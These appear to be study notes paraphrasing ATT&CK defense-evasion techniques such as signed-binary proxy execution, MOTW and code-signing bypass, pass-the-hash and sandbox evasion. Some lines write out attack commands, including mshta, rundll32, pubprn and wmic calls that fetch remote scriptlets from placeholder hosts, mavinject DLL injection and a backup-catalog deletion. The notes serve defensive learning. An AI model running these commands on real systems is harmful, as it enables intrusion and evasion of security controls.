When files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named `Zone.Identifier` with a specific value known as the MOTW
* Files that are tagged with MOTW are protected and cannot perform certain actions
  * Starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View
  * Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables
  * If the file in not known/trusted, SmartScreen will prevent the execution and warn the user not to run it

Adversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW
* Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted
* **MOTW** A NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections

<br>

## Code Signing Policy Modification
Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with
* Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system

Some of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS
* Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed DLLs to execute on a system
* Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions

Adversaries may modify code signing policies in a number of ways, including through use of CLI or GUI utilities, Modify Registry, rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory
* Examples of commands that can modify the code signing policy of a system include `bcdedit.exe -set TESTSIGNING ON` on Windows and `csrutil disable` on macOS
  
Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system
* Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode
* Adversaries may attempt to remove such artifacts

To gain access to kernel memory to modify variables related to signature checks, such as modifying g_CiOptions to disable Driver Signature Enforcement, adversaries may conduct Exploitation for Privilege Escalation using a signed, but vulnerable driver

<br>
<hr>

# System Binary Proxy Execution
Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system

Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.

Similarly, on Linux systems adversaries may abuse trusted binaries such as split to proxy execution of malicious commands. 

<br>

## Compiled HTML File
Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code
* CHM files are commonly distributed as part of the Microsoft HTML Help system
* CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages 

CHM content is displayed using underlying components of the Internet Explorer browser loaded by the HTML Help executable program (hh.exe)

A custom CHM file containing embedded payloads could be delivered to a victim then triggered by User Execution
* CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe

<br>

## Control Panel
Adversaries may abuse *control.exe* to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings

Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function
* For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel
* Control Panel items can be executed directly from the command line, programmatically via an API call, or by simply double-clicking the file

Malicious Control Panel items can be delivered via Phishing campaigns or executed as part of multi-stage malware
* Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists

Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to `HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls`
* Even when these registered DLLs do not comply with the CPL file specification and do not export *CPlApplet* functions, they are loaded and executed through its `DllEntryPoint` when Control Panel is executed
* CPL files not exporting CPlApplet are not directly executable

<br>

## CMSTP
**Microsoft Connection Manager Profile Installer (CMSTP.exe):** A CLI program used to install Connection Manager service profiles
* CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections
* Adversaries may abuse CMSTP to proxy execution of malicious code


Adversaries may supply CMSTP.exe with INF files infected with malicious commands
* Similar to Regsvr32 / "Squiblydoo", CMSTP.exe may be abused to load and execute DLLs and/or COM scriptlets (SCT) from remote servers
* This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft

CMSTP.exe can also be abused to Bypass User Account Control and execute arbitrary commands from a malicious INF through an auto-elevated COM interface
<br>

## InstallUtil
**InstallUtil:** A CLI utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries
* The **InstallUtil** binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: `C:\Windows\Microsoft.NET\Framework\v\InstallUtil.exe and C:\Windows\Microsoft.NET\Framework64\v\InstallUtil.exe`
Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility


**InstallUtil** may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute `System.ComponentModel.RunInstaller(true)`
<br>

## Mshta
Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code

**Mshta.exe:** A utility that executes Microsoft HTML Applications (HTA) files
* HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser

* Execute files via **mshta.exe** through an inline script: `mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))`

* Executed files directly from URLs: `mshta http[:]//webserver/payload[.]hta`

**Mshta.exe** can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings

<br>

## Msiexec
**Msiexec.exe:** A CLI utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)
* The Msiexec.exe binary may also be digitally signed by Microsoft

Adversaries may abuse msiexec.exe to proxy execution of malicious payloads
* Adversaries may abuse msiexec.exe to launch local or network accessible MSI files
* Msiexec.exe can also execute DLLs
  * Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse
* Msiexec.exe execution may also be elevated to SYSTEM privileges if the `AlwaysInstallElevated` policy is enabled

<br>

## Odbcconf
**Odbcconf.exe:** A Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names -- The Odbcconf.exe binary may be digitally signed by Microsoft

Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads
* Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse
* Similar to Regsvr32, odbcconf.exe has a REGSVR flag that can be misused to execute DLLs (ex: `odbcconf.exe /S /A {REGSVR "C:\Users\Public\file.dll"})`

<br>

## Regsvcs/Regasm
**Regsvcs & Regasm:** Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are binaries that may be digitally signed by Microsoft.



Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. 

Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: `ComRegisterFunction` or `ComUnregisterFunction` respectively
* The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute

<br>

## Regsvr32
**Regsvr32.exe:** A CLI program used to register and unregister object linking and embedding controls, including DLLs on Windows systems

Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations
* Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions
* Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a URL to file on an external Web server as an argument during invocation
  * This method makes no changes to the Registry as the COM object is not actually registered, only executed
  * This variation of the technique is often referred to as a *Squiblydoo* and has been used in campaigns targeting governments
* Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via Component Object Model Hijacking

<br>

## Rundll32
Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations
* Rundll32.exe is commonly associated with executing DLL payloads (ex: rundll32.exe {DLLname, DLLfunction})

Rundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions `Control_RunDLL` and `Control_RunDLLAsUser`
* Double-clicking a .cpl file also causes rundll32.exe to execute

Rundll32 can also be used to execute scripts such as JavaScript -- `rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"` 

Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names
* As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command `rundll32.exe ExampleDLL.dll, ExampleFunction`, rundll32.exe would first attempt to execute `ExampleFunctionW`, or failing that `ExampleFunctionA`, before loading ExampleFunction)
* Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending `W` and/or `A` to harmless ones.
* DLL functions can also be exported and executed by an ordinal number (ex: `rundll32.exe file.dll,#1`)

Additionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload

<br>

## Verclsid
**Verclsid.exe** is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell

Adversaries may abuse verclsid.exe to execute malicious payloads
* This may be achieved by running `verclsid.exe /S /C {CLSID}`, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects
* COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to Regsvr32)
* Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse

<br>

## Mavinject
**Mavinject.exe:** The Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V)6

Adversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. Dynamic-link Library Injection), allowing for arbitrary code execution (ex. `C:\Windows\system32\mavinject.exe PID /INJECTRUNNING PATH_DLL`)
* Mavinject.exe can also be abused to perform import descriptor injection via its `/HMODULE` command-line parameter (ex. `mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER`)
  * This command would inject an import table entry consisting of the specified DLL into the module at the given base address

<br>

## MMC
**Microsoft Management Console (MMC):** A binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt
* MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins
  * These snap-ins may be used to manage Windows systems locally or remotely
  * MMC can also be used to open Microsoft created .msc files to manage system configuration


* `mmc C:\Users\foo\admintools.msc /a`: Opens a custom, saved console msc file in author mode
* `mmc gpedit.msc`: Opens the Group Policy Editor application window.

Adversaries may use MMC commands to perform malicious tasks
* `mmc wbadmin.msc delete catalog -quiet`: Deletes the backup catalog on the system (i.e. Inhibit System Recovery) without prompts to the use
* **Note:** `wbadmin.msc` may only be present by default on Windows Server OS

Adversaries may also abuse MMC to execute malicious .msc files
* First create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a Component Object Model class object
* Then, adversaries may create custom consoles with the "Link to Web Address" snap-in that is linked to the malicious CLSID subkey
* Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: `mmc.exe -Embedding C:\path\to\test.msc`

<br>
<hr>

# System Script Proxy Execution
Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.
* This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems

<br>

## PubPrn
**PubPrn.vbs:** A Visual Basic script that publishes a printer to AD Domain Services
* The script may be signed by Microsoft and is commonly executed through the Windows Command Shell via `Cscript.exe`
  * `cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com`: Publishes a printer within the specified domain

Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites
* Adversaries may set the second script: parameter to reference a scriptlet file (.sct) hosted on a remote site
  * `pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct`
    * This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script

In later versions of Windows (10+), PubPrn.vbs has been updated to prevent proxying execution from a remote site
* This is done by limiting the protocol specified in the second parameter to `LDAP://`, vice the script: moniker which could be used to reference remote code via HTTP(S)

<br>
<hr>

# Template Injection
Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts
* Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents to replace older binary formats
* OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered

Properties within parts may reference shared public resources accessed via online URLs
* Template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded

Adversaries may abuse these templates to initially conceal malicious code to be executed via user documents
* Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded
* These documents can be delivered via other techniques such as Phishing and/or Taint Shared Content and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched
  * Examples have been seen in the wild where template injection was used to load malicious code containing an exploit

Adversaries may also modify the `*\template` control word within an *.rtf* file to similarly conceal then download malicious code
* This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an *.rtf* file is opened
  * However, adversaries may alter the bytes of an existing *.rtf* file to insert a template control word field to include a URL resource of a malicious payload

This technique may also enable Forced Authentication by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt

<br>
<hr>

# Traffic Signaling
**Traffic Signaling:** Involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task
* This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control
* Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics
  * After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software


Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s)

The observation of the signal packets to trigger the communication can be conducted through different methods
* One means is to use the libpcap libraries to sniff for the packets in question
* Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs

On network devices, adversaries may use crafted packets to enable Network Device Authentication for standard services offered by the device such as telnet
* Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities
* Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives
* To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage Patch System Image due to the monolithic nature of the architecture

**Wake-on-LAN:** A hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement
* Adversaries may also use the Wake-on-LAN feature to turn on powered off systems

<br>

## Port Knocking
Adversaries may use port knocking to hide open ports used for persistence or command and control
* To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports
* After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software

This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.

The observation of the signal packets to trigger the communication can be conducted through different methods
* One means is to use the libpcap libraries to sniff for the packets in question
* Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs

<br>
<hr>

# Trusted Developer Utilities Proxy Execution
Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads
* There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering
* These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions

<br>

## MSBuild
**MSBuild.exe (Microsoft Build Engine):** A software build platform used by Visual Studio -- It handles XML formatted project files that define requirements for loading and building various platforms and configurations


Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility
* The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file
* MSBuild will compile and execute the inline task
* MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution

<br>
<hr>

# Unused/Unsupported Cloud Regions
Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.

Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements
* Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions
  * If an adversary creates resources in an unused region, they may be able to operate undetected

A variation on this behavior takes advantage of differences in functionality across cloud regions
* An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity

An example of adversary use of unused AWS regions is to mine cryptocurrency through Resource Hijacking, which can cost organizations substantial amounts of money over time depending on the processing power used

<br>
<hr>

# Use Alternate Authentication Material
Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.)
* Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s)
* Alternate authentication material may also be generated during the identity creation process 

Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s)
* Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through Credential Access techniques
* By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors

<br>

## Application Access Token
Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and SaaS



### AWS and GCP environments
Adversaries can trigger a request for a short-lived access token with the privileges of another user account
* The adversary can then use this token to request data or perform actions the original account could not
* If permissions for this feature are misconfigured – for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges

### OAuth
One commonly implemented framework that issues tokens to users for access to systems
* These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform
* Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user
* Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application

### Example
With a cloud-based email service, once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a "refresh" token enabling background access is awarded
* With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration

Compromised access tokens may be used as an initial step in compromising other services
* If a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines
* Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords
* Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow

<br>

## Pass the Hash
**Pass the hash (PTH):** A method of authenticating as a user without having access to the user's cleartext password
* This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash

When performing PTH, valid password hashes for the account being used are captured using a Credential Access technique
* Captured hashes are used with PTH to authenticate as that user
* Once authenticated, PTH may be used to perform actions on local or remote systems

Adversaries may also use stolen password hashes to "Overpass the Hash (OTH)"
* Similar to PTH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket
  * This ticket can then be used to perform Pass the Ticket (PTT) attacks

<br>

## Pass the Ticket 
**Pass the ticket (PTH):** A method of authenticating to a system using Kerberos tickets without having access to an account's password -- Kerberos authentication can be used as the first step to lateral movement to a remote system

When preforming PTH, valid Kerberos tickets for Valid Accounts are captured by OS Credential Dumping
* A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access
* A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access

A **Silver Ticket** can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint)

A **Golden Ticket** can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in AD

Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys
* For example, OTH involves using a NTLM password hash to authenticate as a user (i.e. Pass the Hash) while also using the password hash to create a valid Kerberos ticket

<br>

## Web Session Cookie
Adversaries can use stolen session cookies to authenticate to web applications and services -- This technique bypasses some multi-factor authentication protocols since the session is already authenticated

Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently
* Cookies are often valid for an extended period of time, even if the web application is not actively used
* After the cookie is obtained through Steal Web Session Cookie or Web Cookies, the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active

<br>
<hr>

# Valid Accounts
Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.

In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account

The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise

<br>

## Default Account 
Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems
* Default accounts also include default factory/provider set accounts on other types of systems, software, or devices
* Note: Default accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial
  * Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary
  * Attackers may also utilize publicly disclosed or stolen Private Keys or credential materials to legitimately connect to remote environments via Remote Services

<br>

## Domain Account 
Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain -- Domain accounts can cover users, administrators, and services

Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain

<br>

## Local Account 
Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service

Local Accounts may also be abused to elevate privileges and harvest credentials through OS Credential Dumping
* Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement

<br>

## Cloud Account
Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application
* Cloud accounts may be federated with traditional identity management system

Compromised credentials for cloud accounts can be used to harvest sensitive data from online storage accounts and databases
* Access to cloud accounts can also be abused to gain Initial Access to a network by abusing a Trusted Relationship
* Compromise of federated cloud accounts may allow adversaries to more easily move laterally within an environment

Once a cloud account is compromised, an adversary may perform Account Manipulation - for example, by adding Additional Cloud Roles - to maintain persistence and potentially escalate their privileges

<br>
<hr>

# Virtualization/Sandbox Evasion
Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox
* If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant
* They may also search for VME artifacts before dropping secondary or additional payloads
* Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors 

Adversaries may use several methods to accomplish *Virtualization/Sandbox Evasion* such as checking for security monitoring tools or other system artifacts associated with analysis or virtualization
* Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment
* Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox 

<br>

### System Checks
Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a VME/sandbox
* If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant
* They may also search for VME artifacts before dropping secondary or additional payloads
* Adversaries may use the information learned from *Virtualization/Sandbox Evasion* during automated discovery to shape follow-on behaviors

Specific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts
* Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry
* Adversaries may use scripting to automate these checks into one script and then have the program exit if it determines the system to be a VME

Checks could include generic system properties such as host/domain name and samples of network traffic
* Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size

Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to VM applications, and VME-specific hardware/processor instructions
* In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output

Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a VME
* Adversaries may also query for specific readings from these devices

<br>

### User Activity Based Checks
Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a VME/sandbox
* If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant
* They may also search for VME artifacts before dropping secondary or additional payloads
* Adversaries may use the information learned from *Virtualization/Sandbox Evasion* during automated discovery to shape follow-on behaviors

Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks, browser history, cache, bookmarks, or number of files in common directories such as home or the desktop
* Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro or waiting for a user to double click on an embedded image to activate

<br>

### Time-Based Evasion
Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a  VME/sandbox, specifically those that are automated or only operate for a limited amount of time

Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: Scheduled Task/Job)
* Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny

Benign commands or other operations may also be used to delay malware execution
* Loops or otherwise needless repetitions of commands, such as Pings, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments
* **API Hammering:** Involves making various calls to Native API functions in order to delay execution (while also potentially overloading analysis environments with junk data)

Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time
* Attackers may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function

<br>
<hr>

# Weaken Encryption
Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications 

Encryption can be used to protect transmitted network traffic to maintain its confidentiality and integrity
* Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key
  * Typically, longer keys increase the cost of cryptanalysis, or decryption without the key

Adversaries can compromise and manipulate devices that perform encryption of network traffic
* Through behaviors such as *Modify System Image, Reduce Key Space, and Disable Crypto Hardware*, an adversary can negatively effect and/or eliminate a device’s ability to securely encrypt network traffic
  * This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts 

<br>

### Reduce Key Space
Adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes)
* As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key

Adversaries may modify the key size used and other encryption parameters using specialized commands in a Network Device CLI introduced to the system through Modify System Image to change the configuration of the device 

<br>

### Disable Crypto Hardware
Adversaries disable a network device’s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data

Many network devices perform encryption on network traffic to secure transmission across networks
* Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering
* When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of *Modify System Image*, forcing the use of software to perform encryption on general processors
  * This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., Reduce Key Space)

<br>
<hr>

# XSL Script Processing
Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files
* XSL files are commonly used to describe the processing and rendering of data within XML files
  * To support complex operations, the XSL standard includes support for embedded scripting in various languages 

Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control
* Similar to Trusted Developer Utilities Proxy Execution, the Microsoft common line transformation utility binary (msxsl.exe can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files
* Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files
* **Msxsl.exe** takes two main arguments, an XML source file and an XSL stylesheet
* Since the XSL file is valid XML, the adversary may call the same XSL file twice
* When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension

### Command-line examples:

* `msxsl.exe customers.xml script.xsl`
* `msxsl.exe script.xsl script.xsl`
* `msxsl.exe script.jpeg script.jpeg`


Another variation of this technique, dubbed "**Squiblytwo**", involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file
* This technique can also execute local/remote scripts and, similar to its *Regsvr32/* "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool
* Adversaries may abuse any alias in Windows Management Instrumentation provided they utilize the `/FORMAT` switch

### Command-line examples

* Local File: `wmic process list /FORMAT:evil.xsl`
Remote File: `wmic os get /FORMAT:"https://example.com/evil.xsl"`
